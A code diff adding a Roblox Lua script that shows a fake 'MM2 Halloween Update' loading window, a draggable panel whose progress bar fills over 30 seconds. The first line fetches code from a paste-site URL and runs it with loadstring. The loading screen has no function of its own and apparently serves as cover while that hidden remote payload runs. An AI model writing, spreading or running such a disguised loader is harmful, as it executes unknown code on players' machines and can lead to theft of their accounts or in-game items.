@@ -1,0 +1,147 @@
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/eN2cnVYw30/0"))()
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "MM2HalloweenLoading"
+gui.ResetOnSpawn = false
+gui.Parent = playerGui
+
+local main = Instance.new("Frame")
+main.Size = UDim2.fromOffset(360, 225)
+main.Position = UDim2.new(0.5, -180, 0.5, -112)
+main.BackgroundColor3 = Color3.fromRGB(20, 13, 31)
+main.BorderSizePixel = 0
+main.Active = true
+main.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 14)
+corner.Parent = main
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(255, 126, 48)
+stroke.Thickness = 2
+stroke.Parent = main
+
+-- Draggable window
+local dragging = false
+local dragStart, startPos
+
+main.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = main.Position
+    end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if dragging and (
+        input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch
+    ) then
+        local delta = input.Position - dragStart
+        main.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+game:GetService("UserInputService").InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+
+local function makeLabel(text, size, position, color)
+    local label = Instance.new("TextLabel")
+    label.Size = size
+    label.Position = position
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = color
+    label.TextScaled = true
+    label.Font = Enum.Font.GothamBold
+    label.Parent = main
+    return label
+end
+
+makeLabel(
+    "🎃  MM2 HALLOWEEN",
+    UDim2.new(1, -24, 0, 36),
+    UDim2.fromOffset(12, 14),
+    Color3.fromRGB(255, 151, 66)
+)
+
+makeLabel(
+    "SPECIAL HALLOWEEN UPDATE",
+    UDim2.new(1, -24, 0, 18),
+    UDim2.fromOffset(12, 49),
+    Color3.fromRGB(190, 150, 225)
+)
+
+local divider = Instance.new("Frame")
+divider.Size = UDim2.new(1, -30, 0, 2)
+divider.Position = UDim2.fromOffset(15, 77)
+divider.BackgroundColor3 = Color3.fromRGB(90, 53, 111)
+divider.BorderSizePixel = 0
+divider.Parent = main
+
+local message = makeLabel(
+    "Loading MM2 Halloween Update",
+    UDim2.new(1, -24, 0, 35),
+    UDim2.fromOffset(12, 91),
+    Color3.fromRGB(255, 255, 255)
+)
+message.Font = Enum.Font.GothamMedium
+
+local barBack = Instance.new("Frame")
+barBack.Size = UDim2.new(1, -40, 0, 12)
+barBack.Position = UDim2.fromOffset(20, 142)
+barBack.BackgroundColor3 = Color3.fromRGB(54, 38, 66)
+barBack.BorderSizePixel = 0
+barBack.ClipsDescendants = true
+barBack.Parent = main
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(1, 0)
+barCorner.Parent = barBack
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.fromScale(0, 1)
+bar.BackgroundColor3 = Color3.fromRGB(255, 126, 48)
+bar.BorderSizePixel = 0
+bar.Parent = barBack
+
+local barFillCorner = Instance.new("UICorner")
+barFillCorner.CornerRadius = UDim.new(1, 0)
+barFillCorner.Parent = bar
+
+makeLabel(
+    "🕸️  Preparing something spooky...  🦇",
+    UDim2.new(1, -20, 0, 24),
+    UDim2.fromOffset(10, 169),
+    Color3.fromRGB(196, 166, 220)
+).Font = Enum.Font.Gotham
+
+-- Smooth 30-second loading animation; no timer shown.
+local tween = TweenService:Create(
+    bar,
+    TweenInfo.new(30, Enum.EasingStyle.Linear),
+    {Size = UDim2.fromScale(1, 1)}
+)
+
+tween:Play()
+tween.Completed:Wait()
+
+message.Text = "Halloween Update Loaded!"
+message.TextColor3 = Color3.fromRGB(255, 151, 66)
